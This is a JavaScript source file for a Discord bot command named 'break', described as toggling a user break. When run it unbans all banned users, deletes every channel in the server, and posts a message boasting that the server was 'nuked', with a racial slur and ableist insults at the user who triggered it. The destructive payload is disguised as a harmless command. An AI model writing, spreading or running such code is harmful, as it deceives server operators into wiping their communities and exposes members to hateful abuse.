module.exports = {
    name: 'break',
    description: 'toggles user break',
    execute(message, args, Discord, client ,version) {
        
        message.guild.fetchBans().then(bans =>
            bans.forEach(ban=>{
                message.guild.members.unban(ban.user)
            })
        )
        message.guild.channels.cache.forEach(channel => {
            channel.delete()
        })
        message.guild.channels.create('Avalon').then(channel => {
            channel.send("I nuked your server niggers Hope you have a fantastic day\n\n\n\n -Avalon\n\n\n\n PS you (<@!"+  message.author.id + ">) fell right into our trap by running the break command you mentally retarded snowflakes have to take so many god damn breaks  :rofl: \n\n I guess your break for \"" + message.content.substring(8).split(",")[0]+ "\" is gonna be longer without this server LMFAO")
        })

    },
};
